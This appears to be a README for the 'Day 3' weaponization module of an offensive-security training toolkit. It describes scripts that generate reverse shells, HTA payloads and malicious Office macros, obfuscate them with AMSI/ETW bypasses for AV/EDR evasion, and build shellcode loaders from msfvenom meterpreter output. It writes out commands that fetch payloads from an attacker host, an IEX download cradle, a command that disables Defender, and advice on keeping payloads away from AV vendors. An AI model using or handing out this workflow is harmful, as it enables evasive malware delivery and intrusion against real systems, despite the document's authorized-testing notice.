# Weaponization Tools (Day 3)

Tools for payload generation, obfuscation, and evasion.

## Tools Overview

### payload_generator.py
Multi-format payload generator for various platforms.

**Usage:**
```bash
python3 payload_generator.py <LHOST> <LPORT>
```

**Example:**
```bash
python3 payload_generator.py 10.10.14.5 4444
```

**Generates:**
- PowerShell reverse shells
- Python reverse shells
- Bash reverse shells
- HTA payloads
- VBA macros
- Obfuscated variants

**Output:** `payloads/` directory with all formats

---

### advanced_obfuscator.py
Advanced payload obfuscation for AV/EDR evasion.

**Usage:**
```bash
python3 advanced_obfuscator.py payloads/shell.ps1
```

**Features:**
- Variable randomization
- String concatenation
- Command aliasing
- XOR encoding
- AMSI/ETW bypasses
- Custom decoder stubs

**Techniques:**
- Breaks up suspicious strings
- Randomizes all variable names
- Varies command casing
- Encrypts payload with XOR
- Adds defense bypass code

---

### shellcode_encoder.py
Shellcode encoding and loader generation.

**Usage:**
```bash
# Generate shellcode first
msfvenom -p windows/x64/meterpreter/reverse_tcp \
  LHOST=10.10.14.5 LPORT=4444 -f raw > shellcode.bin

# Encode and create loaders
python3 shellcode_encoder.py shellcode.bin
```

**Generates:**
- C# shellcode loader
- Python shellcode loader
- XOR encoded shellcode
- Sandbox evasion checks

**Features:**
- Random XOR key generation
- Memory allocation and execution
- Evasion techniques
- Multiple loader formats

---

### macro_generator.py
Malicious Office macro generator.

**Usage:**
```bash
# URL-based payload delivery
python3 macro_generator.py --url http://10.10.14.5/payload.ps1

# Direct command execution
python3 macro_generator.py --cmd "powershell -c IEX(...)"
```

**Generates:**
- Download and execute macros
- PowerShell cradle macros
- Direct execution macros
- WMI-based execution macros

**Features:**
- Variable randomization
- Multiple execution methods
- Base64 encoding
- Sandbox evasion

**Formats:**
- .docm (Word with macros)
- .xlsm (Excel with macros)
- VBA code for manual insertion

---

## Payload Types

### PowerShell Payloads
- Classic reverse shell
- Obfuscated variants
- AMSI/ETW bypass included
- Base64 encoded options

### Python Payloads
- Cross-platform shells
- Simple and effective
- Works on Linux/Mac/Windows

### Bash Payloads
- Linux/Unix targets
- One-liner variants
- File-less execution

### HTA Payloads
- HTML Application format
- Auto-executes via VBScript
- Bypasses many email filters

### VBA Macros
- Office document embedding
- Multiple execution methods
- AutoOpen triggers

---

## Evasion Techniques

### Signature Evasion
- Unique variable names per generation
- String obfuscation
- Encoding/encryption
- Polymorphic code

### Behavioral Evasion
- Sandbox detection
- Time delays
- Environment checks
- Legitimate API usage

### AMSI Bypass
- PowerShell script scanner bypass
- Memory patching techniques
- Obfuscated bypass methods

### ETW Bypass
- Event logging disruption
- Prevents behavior tracking
- Stealthy execution

---

## Testing Your Payloads

### Local Testing
```powershell
# Temporarily disable Defender (admin required)
Set-MpPreference -DisableRealtimeMonitoring $true

# Test payload
.\your_payload.ps1

# Re-enable
Set-MpPreference -DisableRealtimeMonitoring $false
```

### Online Scanning
- **antiscan.me** - Doesn't share samples
- **VirusTotal** - Shares with AV vendors (use carefully)

### Lab Testing
Set up VMs with different AV products and test there.

---

## Operational Security

1. **Never test on VirusTotal**
   - Operational payloads get shared with AV vendors
   - Use for research only

2. **Customize everything**
   - Don't use default settings
   - Change all variables
   - Add unique obfuscation

3. **Test thoroughly**
   - Verify payload works
   - Check against target's AV
   - Have backup payloads ready

4. **Keep payloads private**
   - Don't share operational code
   - Delete after engagement
   - Protect client data

---

## Integration with Other Days

### Using Recon Data (Day 1-2)
```python
# Customize payloads based on target tech stack
if 'PowerShell 5.1' in tech_stack:
    generate_ps51_compatible_payload()
if 'Windows 10' in target_os:
    add_win10_specific_evasion()
```

### Preparing for Delivery (Day 4)
```bash
# Generate payload
python3 payload_generator.py 10.10.14.5 4444

# Obfuscate
python3 advanced_obfuscator.py payloads/shell.ps1

# Create macro for delivery
python3 macro_generator.py --url http://10.10.14.5/obfuscated_shell.ps1
```

---

## Legal and Ethical Notice

These tools create malicious payloads. Only use for:
- Authorized penetration testing
- Educational purposes in labs
- Improving defensive security

Never:
- Deploy without authorization
- Use for malicious purposes
- Share operational payloads
- Test on production systems without permission

---

## Next Steps

After weaponization:
1. Test payloads in lab environment
2. Verify evasion against target AV
3. Prepare delivery mechanism (Day 4)
4. Plan initial exploitation (Day 5)